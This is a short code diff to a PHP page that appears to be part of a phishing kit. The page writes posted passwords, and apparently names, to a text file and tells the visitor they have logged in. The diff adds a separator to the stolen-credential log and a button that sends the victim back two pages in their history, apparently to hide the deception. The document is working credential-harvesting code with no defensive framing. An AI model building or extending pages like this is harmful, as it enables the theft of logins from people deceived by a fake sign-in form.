@@ -7,6 +7,7 @@ $Pass = "Password:".$_POST['password']."
 $file=fopen("saved.txt", "a");
 fwrite($file, $Name);
 fwrite($file, $Pass);
+fwrite($file, "===========");
 fclose($file);
 }
 ?>
@@ -14,6 +15,8 @@ fclose($file);
 <html>
 <body>
 	<h1>You have successfull logged in ;-) !!!</h1>
+
+	<input type="button" value="Back" onClick="history.go(-2)"/>
 </body>
 
 </html>
